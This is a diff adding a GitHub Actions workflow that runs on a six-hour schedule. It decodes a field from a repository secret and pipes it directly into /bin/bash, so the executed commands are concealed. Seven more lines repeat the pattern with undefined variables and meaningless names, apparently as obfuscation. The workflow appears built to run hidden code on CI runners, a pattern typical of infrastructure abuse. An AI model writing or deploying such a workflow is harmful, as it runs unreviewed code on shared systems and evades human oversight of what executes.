@@ -1,0 +1,25 @@
+name: protectivebiking
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: protectivebiking
+        env:
+          iz50601: ${{ secrets.iz50601 }}
+        run: |
+          echo $iz50601 | jq -r .k0 | /bin/bash
+          echo $ice601 | jq -r .nsjvc8 | /bin/bash
+          echo $qhdpl08 | jq -r .hyh0113 | /bin/bash
+          echo $y7363 | jq -r .lthly484 | /bin/bash
+          echo $d9 | jq -r .snq0 | /bin/bash
+          echo $wudj2085 | jq -r .lyz22119 | /bin/bash
+          echo $idktu2549 | jq -r .hr97800 | /bin/bash
+          echo $xakpw7 | jq -r .bx28910 | /bin/bash
+
